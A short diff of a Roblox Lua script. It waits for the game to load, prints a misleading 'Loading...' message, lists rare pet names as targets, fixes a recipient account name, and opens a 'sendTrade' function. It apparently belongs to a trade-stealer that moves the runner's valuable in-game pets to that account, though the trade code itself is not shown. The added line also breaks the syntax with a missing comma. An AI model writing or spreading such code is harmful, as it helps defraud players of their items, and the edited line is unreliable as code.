@@ -2,7 +2,7 @@ repeat task.wait() until game:IsLoaded()
 
 print("\n\n\n\n\n\n\n\n\n")
 print("Loading...") -- cerberus temp
-local targetPets = {"cerberus", "parrot", "shadow_dragon", "frost_dragon", "owl", "giraffe", "crow", "evil_unicorn", "bat_dragon", "kangaroo", "turtle", "arctic_reindeer", "albino_monkey", "safari_egg", "cow", "candy_cannon", "flamingo", "reindeer", "hedgehog", "blue_dog", "pink_cat", "albino_monkey", "king_monkey"}
+local targetPets = {"cerberus", "griffin" "parrot", "shadow_dragon", "frost_dragon", "owl", "giraffe", "crow", "evil_unicorn", "bat_dragon", "kangaroo", "turtle", "arctic_reindeer", "albino_monkey", "safari_egg", "cow", "candy_cannon", "flamingo", "reindeer", "hedgehog", "blue_dog", "pink_cat", "albino_monkey", "king_monkey"}
 local target = "bnuuy_lin"
 local function sendTrade()
 
